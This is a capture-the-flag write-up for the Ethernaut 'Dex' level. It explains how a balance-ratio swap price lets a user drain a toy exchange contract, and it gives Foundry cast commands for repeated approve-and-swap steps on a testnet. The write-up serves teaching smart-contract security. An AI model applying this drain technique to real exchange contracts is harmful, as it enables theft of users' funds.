---
layout: writeup
title: "Dex"
level: "Intermediate"
category: "Ethernaut"
description: "One will succeed in this level if they manage to drain each of at least one of the two tokens out of the contract, and allow the contract to report a `bad` price of the assets."
---

## Analysis
The Dex contract is a basic exchange that allows users to swap token1 for token2 and vice versa. The price is determined by the ratio of the tokens currently held by the contract

**The Flaw:**
The vulnerability lies in the get_swap_price function: ((amount * target_Token_Balance) / source_Token_Balance)

## Solution

To solve this, you need to perform a series of swaps. Since the price calculation is flawed, each swap increases your relative purchasing power.

**Step-by-Step:**

1.**Swap 10 Token1 for Token2** Your balance becomes (0, 20).
2.**Swap 20 Token2 for Token1** The ratio has changed, and you get more than 10 Token1 back.
3.**Repeat** Continue swapping your entire balance of the token you just received.
4.**Final Swap** On the last step, calculate exactly how much you need to swap to take the remaining balance of the contract.


## Foundry Scripts

<pre class="plain-code"><code>
# 1.**Approve Dex**
cast send $TOKEN1 "approve(address,uint256)" $DEX 1000 --rpc-url $RPC --private-key $PK
cast send $TOKEN2 "approve(address,uint256)" $DEX 1000 --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY

# 2. **Swap 1(Token1 -> Token2)**
cast send $DEX "swap(address,address,uint256)" $TOKEN1 $TOKEN2 <AMOUNT> --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY

# 3.**Swap 2(Token2 -> Token1)**
cast send $DEX "swap(address,address,uint256)" $TOKEN2 $TOKEN1 <AMOUNT> --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY
// Perform sequence of swaps in order to drain atleast oneof the two Tokens

#4.**Verify the Balance**
cast call $DEX "balanceOf(address,address)" $TOKEN1 $DEX --rpc-url $SEPOLIA_RPC_URL  
cast call $DEX "balanceOf(address,address)" $TOKEN2 $DEX --rpc-url $SEPOLIA_RPC_URL
//Atleast one token balance need to be 0x00

</code></pre>
